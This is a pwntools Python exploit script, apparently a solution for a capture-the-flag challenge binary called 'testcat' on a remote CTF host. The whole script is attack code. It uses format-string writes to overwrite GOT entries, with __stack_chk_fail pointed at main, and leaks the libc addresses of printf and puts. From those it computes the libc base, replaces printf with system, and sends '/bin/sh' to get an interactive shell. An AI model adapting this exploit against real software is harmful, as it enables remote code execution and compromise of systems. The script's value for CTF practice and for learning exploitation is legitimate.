from pwn import *
context.log_level='debug'

### DECLARE ###
BINARY = "./testcat"
URL = "chals.cyberthon22f.ctf.sg"
PORT = 10401
PROMPT = "=> "
MARKER = "RECEIVED:\n"
WRITE_FMT_OFFSET = 6

### SETUP ###
elf = context.binary = ELF(BINARY)
rop = ROP(BINARY)
p = remote(URL, PORT)

### part 1, make it repeat ###

payload1 = flat(
	fmtstr_payload(WRITE_FMT_OFFSET, {elf.got.__stack_chk_fail:elf.symbols.main}),
	"A"*280
)

p.sendlineafter(PROMPT, payload1)

### part 2, leak libc addresses ###

payload2a = flat(
	f"%{WRITE_FMT_OFFSET+1}$sAAAA",
	elf.got['printf'],
	"A"*280 #trigger canary
)

p.sendlineafter(PROMPT, payload2a)

p.recvuntil(MARKER)
printf_libc = u64(p.recvuntil('AAAA', drop=True).strip().ljust(8, b"\x00")) # standard
log.success("libc printf is: " + hex(printf_libc))

payload2b = flat(
	f"%7$sAAAA",
	elf.got['puts'],
	"A"*280 #trigger canary
)

p.sendlineafter(PROMPT, payload2b)

p.recvuntil(MARKER)
puts_libc = u64(p.recvuntil('AAAA', drop=True).strip().ljust(8, b"\x00")) # standard
log.success("libc puts is: " + hex(puts_libc))

### part 3, declare libc and overwrite printf with system ###

libc = ELF("./libc6_2.33-0ubuntu5_amd64.so")

libc_base = puts_libc - libc.symbols['puts']
log.info("libc base is " + hex(libc_base))

libc_system = libc_base + libc.symbols['system']
log.info("libc_system is " + hex(libc_system))

payload3 = flat(
	fmtstr_payload(WRITE_FMT_OFFSET, {elf.got['printf']:libc_system}),
	"A"*280
)

p.sendlineafter(PROMPT, payload3)

payload4 = "/bin/sh\x00"
p.sendline(payload4)

p.interactive()
